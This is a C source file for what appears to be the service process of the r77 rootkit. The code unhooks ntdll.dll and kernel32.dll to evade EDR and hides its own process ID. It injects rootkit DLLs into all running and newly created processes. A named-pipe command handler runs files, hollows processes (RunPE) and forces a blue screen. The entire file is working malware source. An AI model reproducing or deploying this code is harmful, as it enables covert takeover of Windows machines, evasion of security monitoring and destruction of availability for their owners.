#include "Service.h"
#include "r77def.h"
#include "r77win.h"
#include "r77config.h"
#include "r77process.h"
#include "ProcessListener.h"
#include "ControlPipeListener.h"
#include <Psapi.h>

int main()
{
	// Unhook DLL's that are monitored by EDR.
	UnhookDll(L"ntdll.dll");
	if (BITNESS(64) || IsAtLeastWindows10()) // Unhooking kernel32.dll does not work on Windows 7 x86.
	{
		UnhookDll(L"kernel32.dll");
	}

	EnabledDebugPrivilege();

	// Get both r77 DLL's.
	Dll32Size = 1024 * 1024;
	Dll64Size = 1024 * 1024;
	Dll32 = NEW_ARRAY(BYTE, Dll32Size);
	Dll64 = NEW_ARRAY(BYTE, Dll64Size);

	HKEY key;
	if (RegOpenKeyExW(HKEY_LOCAL_MACHINE, L"SOFTWARE", 0, KEY_ALL_ACCESS, &key) != ERROR_SUCCESS ||
		RegQueryValueExW(key, HIDE_PREFIX L"dll32", NULL, NULL, Dll32, &Dll32Size) != ERROR_SUCCESS ||
		RegQueryValueExW(key, HIDE_PREFIX L"dll64", NULL, NULL, Dll64, &Dll64Size) != ERROR_SUCCESS) return 0;

	// Terminate the already running r77 service process.
	TerminateR77Service(GetCurrentProcessId());

	// Create HKEY_LOCAL_MACHINE\SOFTWARE\$77config and set DACL to allow full access by any user.
	HKEY configKey;
	if (InstallR77Config(&configKey))
	{
		// Write current process ID to the list of hidden PID's.
		// Since this process is created using process hollowing (dllhost.exe), the name cannot begin with "$77".
		// Therefore, process hiding by PID must be used.
		HKEY pidKey;
		if (RegCreateKeyExW(configKey, L"pid", 0, NULL, REG_OPTION_NON_VOLATILE, KEY_ALL_ACCESS, NULL, &pidKey, NULL) == ERROR_SUCCESS)
		{
			// The registry values "svc32" and "svc64" are reserved for the r77 service.
			DWORD processId = GetCurrentProcessId();
			RegSetValueExW(pidKey, COALESCE_BITNESS(L"svc32", L"svc64"), 0, REG_DWORD, (LPBYTE)&processId, sizeof(DWORD));
			RegCloseKey(pidKey);
		}

		RegCloseKey(configKey);
	}

	// When the NtResumeThread hook is called, the r77 service is notified through a named pipe connection.
	// This will trigger the following callback and the child process is injected.
	// After it's injected, NtResumeThread is executed in the parent process.
	// This way, r77 is injected before the first instruction is run in the child process.
	ChildProcessListener(ChildProcessCallback);

	// In addition, check for new processes every 100 ms that might have been missed by child process hooking.
	// This is particularly the case for child processes of protected processes (such as services.exe), because protected processes cannot be injected.
	// In the first iteration, the callback is invoked for every currently running process, making this the initial injection into all processes.
	NewProcessListener(100, NewProcessCallback);

	// Open a named pipe to receive commands from any process.
	ControlPipeListener(ControlCallback);

	// There are no implications when injecting a process twice.
	// If the R77_SIGNATURE is already present in the target process, the newly injected DLL will just unload itself.

	// Perform startup of custom files.
	PR77_CONFIG config = LoadR77Config();

	for (DWORD i = 0; i < config->StartupFiles->Count; i++)
	{
		ShellExecuteW(NULL, L"open", config->StartupFiles->Values[i], NULL, NULL, SW_SHOW);
	}

	DeleteR77Config(config);

	Sleep(INFINITE);
	return 0;
}
VOID ChildProcessCallback(DWORD processId)
{
	// Hook the newly created child processes before it is actually started.
	// After this function returns, the original NtResumeThread is called.

	if (!IsInjectionPaused)
	{
		InjectDll(processId, Dll32, Dll32Size);
		InjectDll(processId, Dll64, Dll64Size);
	}
}
VOID NewProcessCallback(DWORD processId)
{
	// Hook new processes that might have been missed by child process hooking.

	if (!IsInjectionPaused)
	{
		InjectDll(processId, Dll32, Dll32Size);
		InjectDll(processId, Dll64, Dll64Size);
	}
}
VOID ControlCallback(DWORD controlCode, HANDLE pipe)
{
	// The r77 service received a command from another process.

	switch (controlCode)
	{
		case CONTROL_R77_TERMINATE_SERVICE:
		{
			ExitProcess(0);
			break;
		}
		case CONTROL_R77_UNINSTALL:
		{
			HKEY key;
			if (RegOpenKeyExW(HKEY_LOCAL_MACHINE, L"SOFTWARE", 0, KEY_ALL_ACCESS, &key) == ERROR_SUCCESS)
			{
				RegDeleteValueW(key, HIDE_PREFIX L"stager");
				RegDeleteValueW(key, HIDE_PREFIX L"dll32");
				RegDeleteValueW(key, HIDE_PREFIX L"dll64");
			}

			DeleteScheduledTask(R77_SERVICE_NAME32);
			DeleteScheduledTask(R77_SERVICE_NAME64);
			DetachAllInjectedProcesses();
			UninstallR77Config();
			TerminateR77Service(-1);
			break;
		}
		case CONTROL_R77_PAUSE_INJECTION:
		{
			IsInjectionPaused = TRUE;
			break;
		}
		case CONTROL_R77_RESUME_INJECTION:
		{
			IsInjectionPaused = FALSE;
			break;
		}
		case CONTROL_PROCESSES_INJECT:
		{
			DWORD processId;
			DWORD bytesRead;
			if (ReadFile(pipe, &processId, sizeof(DWORD), &bytesRead, NULL) && bytesRead == sizeof(DWORD))
			{
				InjectDll(processId, Dll32, Dll32Size);
				InjectDll(processId, Dll64, Dll64Size);
			}

			break;
		}
		case CONTROL_PROCESSES_INJECT_ALL:
		{
			LPDWORD processes = NEW_ARRAY(DWORD, 10000);
			DWORD processCount = 0;
			if (EnumProcesses(processes, sizeof(DWORD) * 10000, &processCount))
			{
				processCount /= sizeof(DWORD);

				for (DWORD i = 0; i < processCount; i++)
				{
					InjectDll(processes[i], Dll32, Dll32Size);
					InjectDll(processes[i], Dll64, Dll64Size);
				}
			}
			break;
		}
		case CONTROL_PROCESSES_DETACH:
		{
			DWORD processId;
			DWORD bytesRead;
			if (ReadFile(pipe, &processId, sizeof(DWORD), &bytesRead, NULL) && bytesRead == sizeof(DWORD))
			{
				DetachInjectedProcessById(processId);
			}

			break;
		}
		case CONTROL_PROCESSES_DETACH_ALL:
		{
			DetachAllInjectedProcesses();
			break;
		}
		case CONTROL_USER_SHELLEXEC:
		{
			WCHAR file[MAX_PATH + 1];
			WCHAR commandLine[MAX_PATH + 1];

			if (ReadFileStringW(pipe, file, MAX_PATH + 1) &&
				ReadFileStringW(pipe, commandLine, MAX_PATH + 1))
			{
				ShellExecuteW(NULL, L"open", file, commandLine, NULL, SW_SHOW);
			}
			break;
		}
		case CONTROL_USER_RUNPE:
		{
			WCHAR path[MAX_PATH + 1];
			if (ReadFileStringW(pipe, path, MAX_PATH + 1))
			{
				DWORD fileSize;
				DWORD bytesRead;
				if (ReadFile(pipe, &fileSize, sizeof(DWORD), &bytesRead, NULL) && bytesRead == sizeof(DWORD))
				{
					LPBYTE file = NEW_ARRAY(BYTE, fileSize);
					if (ReadFile(pipe, file, fileSize, &bytesRead, NULL) && bytesRead == fileSize)
					{
						RunPE(path, file);
					}
					FREE(file);
				}
			}

			break;
		}
		case CONTROL_SYSTEM_BSOD:
		{
			BOOLEAN previousValue = FALSE;
			R77_RtlAdjustPrivilege(20, TRUE, FALSE, &previousValue);

			BOOLEAN oldIsCritical = FALSE;
			R77_RtlSetProcessIsCritical(TRUE, &oldIsCritical, FALSE);

			ExitProcess(0);
			break;
		}
	}
}